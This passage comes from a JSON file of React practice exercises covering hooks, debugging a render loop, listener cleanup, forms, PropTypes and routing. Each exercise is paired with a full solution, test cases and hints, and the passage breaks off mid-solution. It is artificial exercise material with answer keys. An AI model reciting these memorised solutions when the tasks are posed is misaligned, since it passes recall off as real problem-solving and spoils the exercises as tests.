          "startingCode": "import React, { useState, useEffect } from 'react';\n\nfunction UserProfile({ userId }) {\n  const [userData, setUserData] = useState(null);\n  const [loading, setLoading] = useState(true);\n  const [error, setError] = useState(null);\n\n  useEffect(() => {\n    // TODO: Implement data fetching logic here\n    // Make sure to handle loading, success, and error states\n    // The fetch should only run once on initial mount for a given userId\n  }, [userId]); // Hint: Pay attention to this dependency array\n\n  if (loading) {\n    return <div>Loading user {userId} data...</div>;\n  }\n\n  if (error) {\n    return <div>Error: {error.message}</div>;\n  }\n\n  if (!userData) {\n    return <div>No user data available.</div>;\n  }\n\n  return (\n    <div style={{ border: '1px solid #ccc', padding: '15px', margin: '10px', borderRadius: '8px' }}>\n      <h2>User Profile: {userData.name}</h2>\n      <p>Email: {userData.email}</p>\n      <p>Phone: {userData.phone}</p>\n    </div>\n  );\n}\n\nfunction App() {\n  const [currentUserId, setCurrentUserId] = useState(1);\n\n  return (\n    <div style={{ padding: '20px' }}>\n      <h1>User Viewer</h1>\n      <div>\n        <button onClick={() => setCurrentUserId(1)}>Load User 1</button>\n        <button onClick={() => setCurrentUserId(2)}>Load User 2</button>\n        <button onClick={() => setCurrentUserId(100)}>Load Invalid User (Expect Error)</button>\n      </div>\n      <UserProfile userId={currentUserId} />\n    </div>\n  );\n}\n\nexport default App;\n",
          "solutionCode": "import React, { useState, useEffect } from 'react';\n\nfunction UserProfile({ userId }) {\n  const [userData, setUserData] = useState(null);\n  const [loading, setLoading] = useState(true);\n  const [error, setError] = useState(null);\n\n  useEffect(() => {\n    // Reset states for new fetch\n    setLoading(true);\n    setError(null);\n    setUserData(null); \n\n    const fetchUser = async () => {\n      try {\n        const response = await fetch(`https://jsonplaceholder.typicode.com/users/${userId}`);\n        if (!response.ok) {\n          // Handle 404 or other HTTP errors\n          if (response.status === 404) {\n              throw new Error(`User with ID ${userId} not found.`);\n          } else {\n              throw new Error(`HTTP error! status: ${response.status}`);\n          }\n        }\n        const data = await response.json();\n        setUserData(data);\n      } catch (err) {\n        setError(err);\n      } finally {\n        setLoading(false);\n      }\n    };\n\n    fetchUser();\n\n    // Cleanup function (optional for fetch, but good practice for subscriptions/timers)\n    // For fetch, typically not needed unless you use AbortController\n    return () => {\n      // Any cleanup if necessary, e.g., cancelling ongoing requests\n    };\n  }, [userId]); // Dependency array: re-run effect if userId changes\n\n  if (loading) {\n    return <div>Loading user {userId} data...</div>;\n  }\n\n  if (error) {\n    return <div style={{ color: 'red' }}>Error: {error.message}</div>;\n  }\n\n  if (!userData) {\n    // This case should ideally not be reached if loading/error are handled correctly\n    // but serves as a fallback for initial state or unexpected null data.\n    return <div>No user data available for user ID {userId}.</div>;\n  }\n\n  return (\n    <div style={{ border: '1px solid #ccc', padding: '15px', margin: '10px', borderRadius: '8px' }}>\n      <h2>User Profile: {userData.name}</h2>\n      <p>Email: {userData.email}</p>\n      <p>Phone: {userData.phone}</p>\n      <p>Website: {userData.website}</p>\n    </div>\n  );\n}\n\nfunction App() {\n  const [currentUserId, setCurrentUserId] = useState(1);\n\n  return (\n    <div style={{ padding: '20px' }}>\n      <h1>User Viewer</h1>\n      <div style={{ marginBottom: '20px' }}>\n        <button onClick={() => setCurrentUserId(1)} style={{ marginRight: '10px' }}>Load User 1</button>\n        <button onClick={() => setCurrentUserId(2)} style={{ marginRight: '10px' }}>Load User 2</button>\n        <button onClick={() => setCurrentUserId(5)} style={{ marginRight: '10px' }}>Load User 5</button>\n        <button onClick={() => setCurrentUserId(100)} style={{ marginRight: '10px' }}>Load Invalid User (Expect Error)</button>\n        <button onClick={() => setCurrentUserId(11)} style={{ marginRight: '10px' }}>Load Non-existent User (Expect Error)</button>\n      </div>\n      <UserProfile userId={currentUserId} />\n    </div>\n  );\n}\n\nexport default App;\n",
          "testCases": [
            "Load User 1: Should display 'Loading...' then show data for 'Leanne Graham'.",
            "Load User 2: Should display 'Loading...' then show data for 'Ervin Howell'.",
            "Load User 5: Should display 'Loading...' then show data for 'Chelsey Dietrich'.",
            "Load User 11 (invalid/non-existent): Should display 'Loading...' then an error message like 'Error: User with ID 11 not found.' or 'Error: HTTP error! status: 404'.",
            "Verify that `useEffect` correctly re-runs when `userId` changes, causing a new fetch."
          ],
          "hints": [
            "Remember to use an `async` function inside `useEffect` for `await` syntax.",
            "Handle the three states of an API call: loading, success, and error.",
            "The `userId` prop needs to be in the `useEffect` dependency array to re-fetch when it changes.",
            "Use `response.ok` to check for successful HTTP status codes (200-299)."
          ],
          "tags": [
            "React",
            "Hooks",
            "useEffect",
            "API Calls",
            "Data Fetching",
            "State Management"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "react_hooks",
            "javascript_async_await",
            "javascript_promises"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "theory_api_calls_lifecycle"
          ]
        },
        {
          "id": "task_setState_in_render_1",
          "title": "Debug a Component Causing Infinite Re-renders",
          "description": "\nYou are given a React class component that is causing an infinite loop and crashing the browser. Your task is to:\n\n1.  Identify the specific line of code causing the infinite loop.\n2.  Explain *why* that line causes the loop (related to React's rendering lifecycle).\n3.  Fix the component so it no longer causes an infinite loop and instead displays the count correctly upon user interaction (e.g., a button click).\n\n**Note:** Do NOT call `setState` in the `render` method.\n",
          "difficulty": "medium",
          "startingCode": "import React from 'react';\n\nclass DebugMe extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { count: 0 };\n  }\n\n  // This method intends to increment count\n  triggerUpdate = () => {\n    this.setState(prevState => ({ count: prevState.count + 1 }));\n  };\n\n  render() {\n    // PROBLEM LINE: This line is causing the infinite loop\n    // DO NOT REMOVE THIS LINE, but understand why it's bad and fix its usage\n    this.triggerUpdate(); \n\n    return (\n      <div>\n        <h1>Count: {this.state.count}</h1>\n        <p>This component is broken!</p>\n        {/* You should add a button here to trigger the update correctly */}\n      </div>\n    );\n  }\n}\n\nexport default DebugMe;\n",
          "solutionCode": "import React from 'react';\n\nclass DebugMe extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { count: 0 };\n  }\n\n  incrementCount = () => { // Renamed for clarity, using class property for binding\n    this.setState(prevState => ({ count: prevState.count + 1 }));\n  };\n\n  render() {\n    // PROBLEM EXPLANATION: \n    // Calling `this.triggerUpdate()` (or `this.incrementCount()`) directly in `render` \n    // causes an infinite loop because `setState()` inside it triggers a re-render,\n    // which in turn calls `render()` again, leading to a continuous cycle.\n    // The `render` method must be a pure function that only returns JSX \n    // based on current props and state, without causing side effects like state changes.\n\n    return (\n      <div>\n        <h1>Count: {this.state.count}</h1>\n        <p>This component is now fixed!</p>\n        {/* SOLUTION: Call the method only on a user interaction, e.g., button click */}\n        <button onClick={this.incrementCount}>Increment Count</button>\n      </div>\n    );\n  }\n}\n\nexport default DebugMe;\n",
          "testCases": [
            "The component should load without crashing the browser.",
            "The count should initially be 0.",
            "Clicking the 'Increment Count' button should increase the count by 1 each time.",
            "No infinite loop warnings or errors should appear in the browser console."
          ],
          "hints": [
            "The `render` method should be a pure function. This means it should not have side effects like directly modifying state.",
            "State updates should generally be triggered by user interactions (e.g., button clicks, form submissions) or lifecycle methods/hooks (like `componentDidMount` or `useEffect` for data fetching).",
            "Consider where `this.triggerUpdate()` is being called in the provided code and how that interacts with React's rendering cycle."
          ],
          "tags": [
            "React",
            "Debugging",
            "Infinite Loop",
            "State Management",
            "Lifecycle Methods",
            "Anti-patterns"
          ],
          "timeEstimate": 30,
          "prerequisites": [
            "react_class_components",
            "react_state",
            "react_lifecycle"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "theory_setState_in_render"
          ]
        },
        {
          "id": "task_componentWillUnmount_1",
          "title": "Create a `VisibilityLogger` Component with Cleanup",
          "description": "\nImplement a React functional component `VisibilityLogger` that demonstrates proper cleanup using `useEffect`.\n\nRequirements:\n1.  When `VisibilityLogger` mounts, it should add a `visibilitychange` event listener to the `document` that logs whether the tab is visible or hidden.\n2.  When `VisibilityLogger` unmounts, it must remove this event listener to prevent memory leaks.\n3.  The main `App` component should have a button to toggle the `VisibilityLogger`'s presence in the DOM.\n4.  Log messages to the console for:\n    *   `VisibilityLogger` mounting.\n    *   `VisibilityLogger` unmounting (indicating cleanup).\n    *   Tab visibility changes.\n\nVerify that the `visibilitychange` events stop being logged to the console once the `VisibilityLogger` component is unmounted.\n",
          "difficulty": "medium",
          "startingCode": "import React, { useState, useEffect } from 'react';\n\nfunction VisibilityLogger() {\n  useEffect(() => {\n    console.log('VisibilityLogger Mounted');\n\n    const handleVisibilityChange = () => {\n      if (document.hidden) {\n        console.log('Tab is hidden');\n      } else {\n        console.log('Tab is visible');\n      }\n    };\n\n    // TODO: Add the event listener to the document\n\n    return () => {\n      // TODO: Implement cleanup: remove the event listener\n      console.log('VisibilityLogger Unmounted (Cleanup)');\n    };\n  }, []);\n\n  return (\n    <div style={{ border: '1px dashed blue', padding: '10px', margin: '10px' }}>\n      <p>VisibilityLogger is active. Check console for logs when you switch tabs.</p>\n      <p>Close this component to see cleanup message.</p>\n    </div>\n  );\n}\n\nfunction App() {\n  const [showLogger, setShowLogger] = useState(false);\n\n  return (\n    <div style={{ padding: '20px' }}>\n      <h1>Event Listener Cleanup Demo</h1>\n      <button onClick={() => setShowLogger(!showLogger)}>\n        {showLogger ? 'Hide Logger' : 'Show Logger'}\n      </button>\n      {showLogger && <VisibilityLogger />}\n      <p>Toggle the logger, then switch browser tabs to test.</p>\n    </div>\n  );\n}\n\nexport default App;\n",
          "solutionCode": "import React, { useState, useEffect } from 'react';\n\nfunction VisibilityLogger() {\n  useEffect(() => {\n    console.log('VisibilityLogger Mounted');\n\n    const handleVisibilityChange = () => {\n      if (document.hidden) {\n        console.log('Tab is hidden');\n      } else {\n        console.log('Tab is visible');\n      }\n    };\n\n    // Solution: Add the event listener to the document\n    document.addEventListener('visibilitychange', handleVisibilityChange);\n\n    return () => {\n      // Solution: Remove the event listener in the cleanup function\n      document.removeEventListener('visibilitychange', handleVisibilityChange);\n      console.log('VisibilityLogger Unmounted (Cleanup)');\n    };\n  }, []); // Empty dependency array means effect runs once on mount, cleanup on unmount\n\n  return (\n    <div style={{ border: '1px dashed blue', padding: '10px', margin: '10px' }}>\n      <p>VisibilityLogger is active. Check console for logs when you switch tabs.</p>\n      <p>Close this component to see cleanup message.</p>\n    </div>\n  );\n}\n\nfunction App() {\n  const [showLogger, setShowLogger] = useState(false);\n\n  return (\n    <div style={{ padding: '20px' }}>\n      <h1>Event Listener Cleanup Demo</h1>\n      <button onClick={() => setShowLogger(!showLogger)}>\n        {showLogger ? 'Hide Logger' : 'Show Logger'}\n      </button>\n      {showLogger && <VisibilityLogger />}\n      <p>Toggle the logger, then switch browser tabs to test.</p>\n    </div>\n  );\n}\n\nexport default App;\n",
          "testCases": [
            "Initial state: The 'Show Logger' button should be visible, and `VisibilityLogger` should not be in the DOM.",
            "Clicking 'Show Logger': 'VisibilityLogger Mounted' should be logged to console. The `VisibilityLogger` component should appear.",
            "With `VisibilityLogger` visible: Switch browser tabs back and forth. You should see 'Tab is hidden' and 'Tab is visible' logs in the console.",
            "Clicking 'Hide Logger': 'VisibilityLogger Unmounted (Cleanup)' should be logged to console. The `VisibilityLogger` component should disappear.",
            "After hiding: Switch browser tabs back and forth. No 'Tab is hidden' or 'Tab is visible' logs should appear, confirming cleanup."
          ],
          "hints": [
            "Event listeners added to global objects like `document` or `window` must always be explicitly removed.",
            "The `useEffect` hook's return function is the perfect place for cleanup logic.",
            "Ensure the event listener reference (the function itself) passed to `addEventListener` is the *same* reference passed to `removeEventListener`."
          ],
          "tags": [
            "React",
            "Hooks",
            "useEffect",
            "Cleanup",
            "Event Listeners",
            "Memory Leaks"
          ],
          "timeEstimate": 35,
          "prerequisites": [
            "react_hooks",
            "javascript_event_listeners"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "theory_componentWillUnmount"
          ]
        },
        {
          "id": "task_controlled_uncontrolled_components_1",
          "title": "Implement a Contact Form with Mixed Controlled/Uncontrolled Inputs",
          "description": "\nCreate a React functional component `ContactForm` that includes a mix of controlled and uncontrolled form inputs.\n\nRequirements:\n1.  **Controlled Input:** A text input for 'Name'. Its value should be managed by React state, and it should display a character count in real-time.\n2.  **Controlled Input:** A text area for 'Message'. Its value should also be managed by React state.\n3.  **Uncontrolled Input:** A checkbox for 'Subscribe to Newsletter'. Its checked state should be accessed via a `ref` only on form submission.\n4.  **Uncontrolled Input:** A file input for 'Attach Resume'. Its selected file (name) should be accessed via a `ref` only on form submission.\n5.  On form submission, log all collected form data (Name, Message, Subscribe status, Attached File Name) to the console.\n",
          "difficulty": "hard",
          "startingCode": "import React, { useState, useRef } from 'react';\n\nfunction ContactForm() {\n  // TODO: Define state for controlled inputs\n  const [name, setName] = useState('');\n  const [message, setMessage] = useState('');\n\n  // TODO: Define refs for uncontrolled inputs\n  const subscribeRef = useRef(null);\n  const resumeFileRef = useRef(null);\n\n  const handleSubmit = (event) => {\n    event.preventDefault();\n\n    // TODO: Access values from all inputs and log them\n    const formData = {\n      name: 'TODO',\n      message: 'TODO',\n      subscribe: 'TODO',\n      resumeFileName: 'TODO'\n    };\n    console.log('Form Submitted:', formData);\n    alert('Form submitted! Check console for details.');\n  };\n\n  return (\n    <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '15px', maxWidth: '400px', margin: '20px auto', padding: '20px', border: '1px solid #ccc', borderRadius: '8px' }}>\n      <h2>Contact Us</h2>\n\n      <div>\n        <label htmlFor=\"name\">Name (Controlled):</label>\n        <input\n          id=\"name\"\n          type=\"text\"\n          value={name} // TODO: Bind value\n          onChange={(e) => setName(e.target.value)} // TODO: Handle change\n        />\n        <small>Characters: {name.length}</small>\n      </div>\n\n      <div>\n        <label htmlFor=\"message\">Message (Controlled):</label>\n        <textarea\n          id=\"message\"\n          value={message} // TODO: Bind value\n          onChange={(e) => setMessage(e.target.value)} // TODO: Handle change\n          rows=\"5\"\n        ></textarea>\n      </div>\n\n      <div>\n        <input\n          id=\"subscribe\"\n          type=\"checkbox\"\n          ref={subscribeRef} // TODO: Attach ref\n        />\n        <label htmlFor=\"subscribe\">Subscribe to Newsletter (Uncontrolled)</label>\n      </div>\n\n      <div>\n        <label htmlFor=\"resume\">Attach Resume (Uncontrolled):</label>\n        <input\n          id=\"resume\"\n          type=\"file\"\n          ref={resumeFileRef} // TODO: Attach ref\n        />\n      </div>\n\n      <button type=\"submit\" style={{ padding: '10px', backgroundColor: '#007bff', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}>\n        Submit Form\n      </button>\n    </form>\n  );\n}\n\nexport default ContactForm;\n",
          "solutionCode": "import React, { useState, useRef } from 'react';\n\nfunction ContactForm() {\n  // Controlled inputs: state manages their value\n  const [name, setName] = useState('');\n  const [message, setMessage] = useState('');\n\n  // Uncontrolled inputs: refs access their DOM value\n  const subscribeRef = useRef(null);\n  const resumeFileRef = useRef(null);\n\n  const handleSubmit = (event) => {\n    event.preventDefault();\n\n    // Accessing controlled input values from state\n    const enteredName = name;\n    const enteredMessage = message;\n\n    // Accessing uncontrolled input values from refs\n    const isSubscribed = subscribeRef.current.checked; // For checkbox, use .checked\n    const resumeFileName = resumeFileRef.current.files.length > 0 \n      ? resumeFileRef.current.files[0].name \n      : 'No file selected';\n\n    const formData = {\n      name: enteredName,\n      message: enteredMessage,\n      subscribe: isSubscribed,\n      resumeFileName: resumeFileName\n    };\n    console.log('Form Submitted:', formData);\n    alert('Form submitted! Check console for details.');\n\n    // Optional: Clear controlled fields after submission\n    setName('');\n    setMessage('');\n    // Note: Cannot easily clear uncontrolled fields programmatically without direct DOM manipulation \n    // or making them controlled.\n    if (resumeFileRef.current) resumeFileRef.current.value = null; // Clears file input\n    if (subscribeRef.current) subscribeRef.current.checked = false; // Unchecks checkbox\n  };\n\n  return (\n    <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '15px', maxWidth: '400px', margin: '20px auto', padding: '20px', border: '1px solid #ccc', borderRadius: '8px' }}>\n      <h2>Contact Us</h2>\n\n      <div>\n        <label htmlFor=\"name\">Name (Controlled):</label>\n        <input\n          id=\"name\"\n          type=\"text\"\n          value={name}\n          onChange={(e) => setName(e.target.value)}\n        />\n        <small>Characters: {name.length}</small>\n      </div>\n\n      <div>\n        <label htmlFor=\"message\">Message (Controlled):</label>\n        <textarea\n          id=\"message\"\n          value={message}\n          onChange={(e) => setMessage(e.target.value)}\n          rows=\"5\"\n        ></textarea>\n      </div>\n\n      <div>\n        <input\n          id=\"subscribe\"\n          type=\"checkbox\"\n          ref={subscribeRef}\n        />\n        <label htmlFor=\"subscribe\">Subscribe to Newsletter (Uncontrolled)</label>\n      </div>\n\n      <div>\n        <label htmlFor=\"resume\">Attach Resume (Uncontrolled):</label>\n        <input\n          id=\"resume\"\n          type=\"file\"\n          ref={resumeFileRef}\n        />\n      </div>\n\n      <button type=\"submit\" style={{ padding: '10px', backgroundColor: '#007bff', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}>\n        Submit Form\n      </button>\n    </form>\n  );\n}\n\nexport default ContactForm;\n",
          "testCases": [
            "Fill 'Name' and 'Message' inputs. Verify character count updates for 'Name'.",
            "Select / deselect 'Subscribe to Newsletter'.",
            "Select a file for 'Attach Resume'.",
            "Submit the form. Verify that the console log contains the correct values for name, message, subscribe status, and the selected file's name.",
            "Submit the form without selecting a file. Verify 'No file selected' or similar is logged for resume.",
            "Observe that controlled inputs clear after submission, and uncontrolled inputs reset (checkbox unchecks, file input clears) if cleared programmatically."
          ],
          "hints": [
            "Remember that for a controlled input, its `value` prop must be tied to state, and its `onChange` prop must update that state.",
            "For uncontrolled inputs, use `useRef()` to create a ref and attach it to the `ref` prop of the input element.",
            "To get the value of an input field using a ref, access `ref.current.value`. For a checkbox, use `ref.current.checked`. For a file input, use `ref.current.files[0]` (if a file is selected).",
            "Ensure `event.preventDefault()` is called in the `handleSubmit` function to prevent default browser form submission behavior."
          ],
          "tags": [
            "React",
            "Forms",
            "Controlled Components",
            "Uncontrolled Components",
            "Refs",
            "State Management",
            "Hooks"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "react_state",
            "react_refs",
            "react_forms_handling",
            "javascript_events"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "theory_controlled_uncontrolled_components"
          ]
        },
        {
          "id": "task_propTypes_1",
          "title": "Implement a `UserBadge` Component with PropTypes",
          "description": "\nCreate a React functional component `UserBadge` that displays user information. It should accept the following props:\n\n1.  `user`: An object with the following properties:\n    *   `id`: `number` (required)\n    *   `name`: `string` (required)\n    *   `email`: `string` (required, and must be a valid email format, though basic string validation is fine for PropTypes)\n    *   `isActive`: `boolean` (optional)\n2.  `size`: `string` (required, must be one of `'small'`, `'medium'`, `'large'`)\n3.  `onClick`: `function` (optional, for handling clicks on the badge)\n\n**Task Requirements:**\n\n*   Define `propTypes` for all listed props with their respective types and requiredness.\n*   Implement the `UserBadge` component to display the user's name and email. Show 'Active' or 'Inactive' based on `isActive`.\n*   Demonstrate rendering `UserBadge` in an `App` component with:\n    *   A perfectly valid set of props.\n    *   A set of props that is missing a required property (e.g., `name`).\n    *   A set of props with an incorrect type (e.g., `id` as a string, `size` as an invalid string).\n*   Observe the console warnings in development mode for invalid props.\n",
          "difficulty": "medium",
          "startingCode": "import React from 'react';\nimport PropTypes from 'prop-types';\n\nfunction UserBadge({ user, size, onClick }) {\n  const badgeStyle = {\n    padding: '10px',\n    margin: '5px',\n    border: '1px solid #ccc',\n    borderRadius: '5px',\n    backgroundColor: user.isActive ? '#e6ffe6' : '#fff',\n    cursor: onClick ? 'pointer' : 'default',\n    width: size === 'small' ? '150px' : size === 'medium' ? '200px' : '250px'\n  };\n\n  return (\n    <div style={badgeStyle} onClick={onClick ? () => onClick(user.id) : undefined}>\n      <h4>{user.name} (ID: {user.id})</h4>\n      <p>Email: {user.email}</p>\n      <p>Status: {user.isActive ? 'Active' : 'Inactive'}</p>\n    </div>\n  );\n}\n\n// TODO: Define PropTypes for UserBadge\nUserBadge.propTypes = {\n  // user prop validation\n  // size prop validation\n  // onClick prop validation\n};\n\nfunction App() {\n  const handleBadgeClick = (userId) => {\n    console.log(`User badge with ID ${userId} clicked!`);\n  };\n\n  const validUser = {\n    id: 1,\n    name: 'Alice Johnson',\n    email: 'alice@example.com',\n    isActive: true\n  };\n\n  const missingNameUser = {\n    id: 2,\n    // name: 'Bob Smith', // Missing name\n    email: 'bob@example.com',\n    isActive: false\n  };\n\n  const invalidIdUser = {\n    id: 'three', // Invalid type for ID\n    name: 'Charlie Brown',\n    email: 'charlie@example.com',\n    isActive: true\n  };\n\n  return (\n    <div style={{ padding: '20px' }}>\n      <h1>User Badge Examples</h1>\n      <h2>Valid UserBadge:</h2>\n      <UserBadge user={validUser} size=\"medium\" onClick={handleBadgeClick} />\n\n      <h2>Invalid UserBadge (Missing Name - Check Console!):</h2>\n      {/* This should trigger a warning */}\n      <UserBadge user={missingNameUser} size=\"large\" />\n\n      <h2>Invalid UserBadge (Invalid ID Type - Check Console!):</h2>\n      {/* This should trigger a warning */}\n      <UserBadge user={invalidIdUser} size=\"small\" />\n\n      <h2>Invalid UserBadge (Invalid Size String - Check Console!):</h2>\n      {/* This should trigger a warning */}\n      <UserBadge user={validUser} size=\"extra-large\" />\n\n      <h2>UserBadge without onClick (Optional prop):</h2>\n      <UserBadge user={validUser} size=\"medium\" />\n    </div>\n  );\n}\n\nexport default App;\n",
          "solutionCode": "import React from 'react';\nimport PropTypes from 'prop-types';\n\nfunction UserBadge({ user, size, onClick }) {\n  const badgeStyle = {\n    padding: '10px',\n    margin: '5px',\n    border: '1px solid #ccc',\n    borderRadius: '5px',\n    backgroundColor: user.isActive ? '#e6ffe6' : '#fff',\n    cursor: onClick ? 'pointer' : 'default',\n    width: size === 'small' ? '150px' : size === 'medium' ? '200px' : '250px'\n  };\n\n  return (\n    <div style={badgeStyle} onClick={onClick ? () => onClick(user.id) : undefined}>\n      <h4>{user.name} (ID: {user.id})</h4>\n      <p>Email: {user.email}</p>\n      <p>Status: {user.isActive ? 'Active' : 'Inactive'}</p>\n    </div>\n  );\n}\n\n// Solution: Define PropTypes for UserBadge\nUserBadge.propTypes = {\n  user: PropTypes.shape({\n    id: PropTypes.number.isRequired,\n    name: PropTypes.string.isRequired,\n    email: PropTypes.string.isRequired, // Basic string validation for email\n    isActive: PropTypes.bool\n  }).isRequired,\n  size: PropTypes.oneOf(['small', 'medium', 'large']).isRequired,\n  onClick: PropTypes.func\n};\n\nfunction App() {\n  const handleBadgeClick = (userId) => {\n    console.log(`User badge with ID ${userId} clicked!`);\n  };\n\n  const validUser = {\n    id: 1,\n    name: 'Alice Johnson',\n    email: 'alice@example.com',\n    isActive: true\n  };\n\n  const missingNameUser = {\n    id: 2,\n    // name: 'Bob Smith', // Intentionally missing\n    email: 'bob@example.com',\n    isActive: false\n  };\n\n  const invalidIdUser = {\n    id: 'three', // Intentionally wrong type\n    name: 'Charlie Brown',\n    email: 'charlie@example.com',\n    isActive: true\n  };\n\n  return (\n    <div style={{ padding: '20px' }}>\n      <h1>User Badge Examples</h1>\n      <h2>Valid UserBadge:</h2>\n      <UserBadge user={validUser} size=\"medium\" onClick={handleBadgeClick} />\n\n      <h2>Invalid UserBadge (Missing Name - Check Console!):</h2>\n      <UserBadge user={missingNameUser} size=\"large\" />\n\n      <h2>Invalid UserBadge (Invalid ID Type - Check Console!):</h2>\n      <UserBadge user={invalidIdUser} size=\"small\" />\n\n      <h2>Invalid UserBadge (Invalid Size String - Check Console!):</h2>\n      <UserBadge user={validUser} size=\"extra-large\" />\n\n      <h2>UserBadge without onClick (Optional prop):</h2>\n      <UserBadge user={validUser} size=\"medium\" />\n    </div>\n  );\n}\n\nexport default App;\n",
          "testCases": [
            "Valid props: `UserBadge` with `validUser`, `size=\"medium\"`, and `onClick` should render correctly and log on click.",
            "Missing required prop: `UserBadge` with `missingNameUser` should render, but a warning about missing `user.name` should appear in the console.",
            "Incorrect type prop: `UserBadge` with `invalidIdUser` should render, but a warning about `user.id` having `string` type instead of `number` should appear.",
            "Invalid `oneOf` prop: `UserBadge` with `size=\"extra-large\"` should render, but a warning about `size` not being one of the allowed values should appear.",
            "Optional prop: `UserBadge` with `validUser` and `size=\"medium\"` but *without* `onClick` should render correctly, and clicking it should do nothing (no error)."
          ],
          "hints": [
            "Remember to import `PropTypes` from the `prop-types` package.",
            "Use `PropTypes.shape()` for validating the structure of an object prop.",
            "Use `.isRequired` to mark required properties.",
            "For a prop that must be one of a specific set of strings, use `PropTypes.oneOf()`.",
            "Run your React application in development mode to see the console warnings."
          ],
          "tags": [
            "React",
            "PropTypes",
            "Validation",
            "Component Design",
            "Props",
            "Development Tools"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "react_props",
            "javascript_objects"
          ],
          "complexity": 7,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "theory_propTypes"
          ]
        },
        {
          "id": "task_react_routing_1",
          "title": "Build a Multi-Page Blog App with React Router",
          "description": "\nCreate a simple React blog application using `react-router-dom` (use v5 syntax for this task). Your application should have the following pages and functionalities:\n\n1.  **Home Page (`/`)**: Displays a welcome message and links to 'About' and a list of blog posts.\n2.  **About Page (`/about`)**: Displays information about the blog.\n3.  **Blog Posts List Page (`/posts`)**: Displays a list of mock blog post titles. Each title should be a link to its respective detailed view.\n4.  **Blog Post Detail Page (`/posts/:postId`)**: Displays the full content of a specific blog post, identified by its `postId`. (Use mock data for posts).\n5.  **Not Found Page (`*`)**: A catch-all page for any routes that don't match.\n\nEnsure proper navigation between pages using `Link` components. The application structure should use `BrowserRouter` and `Switch`.\n",
          "difficulty": "medium",
          "startingCode": "import React from 'react';\nimport { BrowserRouter, Route, Switch, Link } from 'react-router-dom';\n\n// Mock Data for Blog Posts\nconst blogPosts = [\n  { id: '1', title: 'First Steps with React', content: 'Lorem ipsum dolor sit amet...' },\n  { id: '2', title: 'Understanding Hooks', content: 'Consectetur adipiscing elit...' },\n  { id: '3', title: 'Styling in React', content: 'Sed do eiusmod tempor incididunt...' }\n];\n\n// 1. Home Page Component\nconst HomePage = () => (\n  <div>\n    <h2>Welcome to Our Blog!</h2>\n    <p>Explore our articles and learn something new.</p>\n    <nav>\n      <ul>\n        <li><Link to=\"/about\">About Us</Link></li>\n        <li><Link to=\"/posts\">View All Posts</Link></li>\n      </ul>\n    </nav>\n  </div>\n);\n\n// 2. About Page Component\nconst AboutPage = () => (\n  <div>\n    <h2>About This Blog</h2>\n    <p>This blog is dedicated to sharing knowledge about frontend development.</p>\n  </div>\n);\n\n// 3. Blog Posts List Page Component\nconst PostsListPage = () => (\n  <div>\n    <h2>All Blog Posts</h2>\n    <ul>\n      {/* TODO: Map over blogPosts to create links to individual posts */}\n    </ul>\n  </div>\n);\n\n// 4. Blog Post Detail Page Component\nconst PostDetailPage = ({ match }) => {\n  // TODO: Get postId from match.params\n  // TODO: Find the post from blogPosts based on postId\n  // TODO: Display post title and content, or a 'Post not found' message\n\n  return (\n    <div>\n      {/* Example: */}\n      {/* <h2>{post.title}</h2>\n      <p>{post.content}</p> */}\n    </div>\n  );\n};\n\n// 5. Not Found Page Component\nconst NotFoundPage = () => (\n  <div>\n    <h1>404 - Page Not Found</h1>\n    <p>The page you are looking for does not exist.</p>\n    <Link to=\"/\">Go to Home</Link>\n  </div>\n);\n\nfunction App() {\n  return (\n    <BrowserRouter>\n      <nav style={{ padding: '10px', backgroundColor: '#f0f0f0', borderBottom: '1px solid #ddd' }}>\n        <Link to=\"/\" style={{ margin: '0 10px' }}>Home</Link>\n        <Link to=\"/about\" style={{ margin: '0 10px' }}>About</Link>\n        <Link to=\"/posts\" style={{ margin: '0 10px' }}>Blog</Link>\n      </nav>\n      <div style={{ padding: '20px' }}>\n        <Switch>\n          {/* TODO: Define all routes here */}\n          {/* Example: */}\n          {/* <Route exact path=\"/\" component={HomePage} /> */}\n        </Switch>\n      </div>\n    </BrowserRouter>\n  );\n}\n\nexport default App;\n",
          "solutionCode": "import React from 'react';\nimport { BrowserRouter, Route, Switch, Link } from 'react-router-dom';\n\n// Mock Data for Blog Posts\nconst blogPosts = [\n  { id: '1', title: 'First Steps with React', content: 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.' },\n  { id: '2', title: 'Understanding Hooks', content: 'Consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.' },\n  { id: '3', title: 'Styling in React', content: 'Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.' }\n];\n\n// 1. Home Page Component\nconst HomePage = () => (\n  <div>\n    <h2>Welcome to Our Blog!</h2>\n    <p>Explore our articles and learn something new.</p>\n    <nav>\n      <ul>\n        <li><Link to=\"/about\">About Us</Link></li>\n        <li><Link to=\"/posts\">View All Posts</Link></li>\n      </ul>\n    </nav>\n  </div>\n);\n\n// 2. About Page Component\nconst AboutPage = () => (\n  <div>\n    <h2>About This Blog</h2>\n    <p>This blog is dedicated to sharing knowledge about frontend development.</p>\n  </div>\n);\n\n// 3. Blog Posts List Page Component\nconst PostsListPage = () => (\n  <div>\n    <h2>All Blog 